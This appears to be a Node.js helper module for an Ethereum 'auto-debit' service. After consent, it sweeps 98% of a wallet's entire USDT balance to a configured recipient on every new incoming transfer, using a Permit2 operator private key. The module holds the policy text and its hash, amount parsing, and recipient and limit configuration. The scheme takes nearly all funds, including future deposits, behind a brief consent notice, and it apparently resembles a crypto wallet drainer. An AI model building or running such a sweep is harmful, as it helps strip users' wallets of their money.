import crypto from 'node:crypto';
import { normalizeEvmAddress } from './evm.mjs';

export const EVM_AUTODEBIT_POLICY_VERSION = 'evm-usdt-autodebit-9800-v1';
export const EVM_AUTODEBIT_POLICY_TEXT = 'On Ethereum Mainnet, each new confirmed incoming USDT transfer after consent is enabled triggers a balance check. If the current balance is at least 10 USDT, the service sends 98% of the entire current balance to the displayed recipient, not just the new deposit. The balance present when consent is enabled is not charged immediately, but may be included after a later incoming transfer. You can revoke consent at any time. Transactions already submitted to Ethereum cannot be canceled.';
export const EVM_AUTODEBIT_MIN_BALANCE_BASE_UNITS = 10_000_000n;
export const EVM_AUTODEBIT_PERCENTAGE_BPS = 9_800n;

const BPS_DENOMINATOR = 10_000n;

export function getAutoDebitPolicyTextHash() {
  return crypto.createHash('sha256').update(EVM_AUTODEBIT_POLICY_TEXT, 'utf8').digest('hex');
}

export function calculateAutoDebitAmount(balanceBaseUnits) {
  let balance;
  try {
    balance = BigInt(balanceBaseUnits);
  } catch {
    throw new Error('Balance must be an integer number of USDT base units');
  }
  if (balance < EVM_AUTODEBIT_MIN_BALANCE_BASE_UNITS) return 0n;
  return (balance * EVM_AUTODEBIT_PERCENTAGE_BPS) / BPS_DENOMINATOR;
}

export function parseUsdtAmountToBaseUnits(value) {
  if (typeof value !== 'string' || !/^(?:0|[1-9][0-9]*)(?:\.[0-9]{1,6})?$/.test(value)) {
    throw Object.assign(new Error('Amount must be a decimal USDT value with up to 6 decimal places'), {
      status: 400,
    });
  }

  const [whole, fractional = ''] = value.split('.');
  const baseUnits = BigInt(whole) * 1_000_000n + BigInt(fractional.padEnd(6, '0') || '0');
  if (baseUnits <= 0n) {
    throw Object.assign(new Error('Amount must be greater than zero'), { status: 400 });
  }
  return baseUnits;
}

export function formatUsdtBaseUnits(value) {
  let amount;
  try {
    amount = BigInt(value);
  } catch {
    throw new Error('Amount must be an integer number of USDT base units');
  }
  const negative = amount < 0n;
  const absolute = negative ? -amount : amount;
  const whole = absolute / 1_000_000n;
  const fraction = (absolute % 1_000_000n).toString().padStart(6, '0').replace(/0+$/, '');
  return `${negative ? '-' : ''}${whole}${fraction ? `.${fraction}` : ''}`;
}

export function getAutoDebitConfiguration(env = process.env, { requireEnabled = true } = {}) {
  if (requireEnabled && env.EVM_AUTO_CHARGE_ENABLED !== '1') {
    throw Object.assign(new Error('Automatic EVM charges are disabled'), { status: 503 });
  }
  if (!env.SUPABASE_URL || !env.SUPABASE_SERVICE_ROLE_KEY) {
    throw Object.assign(new Error('Supabase is not configured'), { status: 503 });
  }
  if (!env.EVM_MAINNET_RPC_URL && !env.ETHEREUM_MAINNET_RPC_URL) {
    throw Object.assign(new Error('Ethereum Mainnet RPC is not configured'), { status: 503 });
  }
  if (!env.PERMIT2_OPERATOR_PRIVATE_KEY) {
    throw Object.assign(new Error('Permit2 operator wallet is not configured'), { status: 503 });
  }

  let recipientAddress;
  try {
    recipientAddress = normalizeEvmAddress(env.EVM_AUTO_CHARGE_RECIPIENT, 'EVM_AUTO_CHARGE_RECIPIENT');
  } catch {
    throw Object.assign(new Error('A valid automatic charge recipient is not configured'), { status: 503 });
  }

  let allowlistedRecipients;
  try {
    allowlistedRecipients = (env.EVM_CHARGE_RECIPIENT_ALLOWLIST || '')
      .split(',')
      .map((address) => normalizeEvmAddress(address.trim(), 'allowlist recipient'));
  } catch {
    throw Object.assign(new Error('EVM charge recipient allowlist is invalid'), { status: 503 });
  }
  if (!allowlistedRecipients.includes(recipientAddress)) {
    throw Object.assign(new Error('Automatic charge recipient is not allowlisted'), { status: 503 });
  }

  const parseLimit = (key) => {
    try {
      const value = BigInt(env[key]);
      if (value <= 0n) throw new Error('not positive');
      return value;
    } catch {
      throw Object.assign(new Error(`${key} must be a positive integer of USDT base units`), { status: 503 });
    }
  };

  return {
    recipientAddress,
    userDailyMax: parseLimit('EVM_AUTO_CHARGE_DAILY_MAX_BASE_UNITS'),
    globalDailyMax: parseLimit('EVM_AUTO_CHARGE_GLOBAL_DAILY_MAX_BASE_UNITS'),
  };
}